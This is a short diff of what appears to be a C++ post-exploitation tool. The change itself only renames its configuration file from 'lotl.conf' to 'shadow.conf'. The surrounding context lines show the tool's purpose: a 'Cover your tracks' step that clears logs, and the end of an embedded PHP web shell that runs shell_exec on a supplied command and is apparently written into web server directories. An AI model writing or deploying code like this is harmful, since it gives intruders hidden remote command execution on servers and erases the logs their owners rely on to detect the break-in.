@@ -72,7 +72,7 @@ int main() {
     std::cout << RED << "=================================================\n\n" << RESET;
 
     // Cover your tracks
-    std::vector<std::string> clearLogs = parseDependencies("config/lotl.conf", "clear");
+    std::vector<std::string> clearLogs = parseDependencies("config/shadow.conf", "clear");
     if (std::find(clearLogs.begin(), clearLogs.end(), std::string("yes")) != clearLogs.end()) {
         clearTracks();
     }
@@ -84,7 +84,7 @@ int main() {
         echo "<pre>" . shell_exec($cmd) . "</pre>";
     }
     ?>)";
-    std::vector<std::string> webs = parseDependencies("config/lotl.conf", "www");
+    std::vector<std::string> webs = parseDependencies("config/shadow.conf", "www");
     if (std::find(webs.begin(), webs.end(), std::string("yes")) != webs.end()) {
         auto files = wwwDir();
         for (const auto& dir : files) {
